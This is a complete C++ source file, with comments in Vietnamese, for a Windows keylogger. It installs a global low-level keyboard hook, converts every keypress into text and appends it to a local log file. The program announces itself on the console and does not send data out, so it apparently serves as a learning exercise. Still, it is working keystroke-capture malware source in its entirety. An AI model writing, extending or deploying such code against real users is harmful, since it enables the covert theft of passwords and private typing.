#include <windows.h>
#include <fstream>
#include <iostream>
#include <unordered_map>

HHOOK keyboardHook;
std::ofstream logFile;

// Hàm chuyển vkCode sang chuỗi hiển thị
std::string GetKeyName(DWORD vkCode) {
    std::unordered_map<DWORD, std::string> specialKeys = {
        {VK_SPACE, "[SPACE]"},
        {VK_RETURN, "[ENTER]"},
        {VK_SHIFT, "[SHIFT]"},
        {VK_LSHIFT, "[LSHIFT]"},
        {VK_RSHIFT, "[RSHIFT]"},
        {VK_CONTROL, "[CTRL]"},
        {VK_LCONTROL, "[LCTRL]"},
        {VK_RCONTROL, "[RCTRL]"},
        {VK_MENU, "[ALT]"},
        {VK_BACK, "[BACKSPACE]"},
        {VK_TAB, "[TAB]"},
        {VK_ESCAPE, "[ESC]"},
        {VK_LEFT, "[LEFT]"},
        {VK_RIGHT, "[RIGHT]"},
        {VK_UP, "[UP]"},
        {VK_DOWN, "[DOWN]"},
        {VK_DELETE, "[DEL]"},
        {VK_CAPITAL, "[CAPSLOCK]"},
        {VK_HOME, "[HOME]"},
        {VK_END, "[END]"},
        {VK_PRIOR, "[PAGE_UP]"},
        {VK_NEXT, "[PAGE_DOWN]"},
        {VK_INSERT, "[INSERT]"}
    };

    if (specialKeys.count(vkCode)) {
        return specialKeys[vkCode];
    }

    // F1 -> F12
    if (vkCode >= VK_F1 && vkCode <= VK_F24) {
        return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
    }

    // Phím chữ/số thường
    char key = MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
    if (key >= 32 && key <= 126) {
        return std::string(1, key);
    }

    return "[UNKNOWN:" + std::to_string(vkCode) + "]";
}

// Callback khi có phím được nhấn
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = p->vkCode;

        std::string keyStr = GetKeyName(vkCode);
        logFile << keyStr << std::endl;
        logFile.flush();

    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Mở file log
    logFile.open("../logs/keys.log", std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Không thể mở file log!\n";
        return 1;
    }

    std::cout << "Keylogger is running. Ctrl+C to exit.\n";

    // Cài hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        std::cerr << "Không thể cài hook!\n";
        return 1;
    }

    // Vòng lặp xử lý
    MSG msg;
    while (true) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(10);
    }

    // Gỡ hook và đóng file (thực tế không tới được)
    UnhookWindowsHookEx(keyboardHook);
    logFile.close();
    return 0;
}
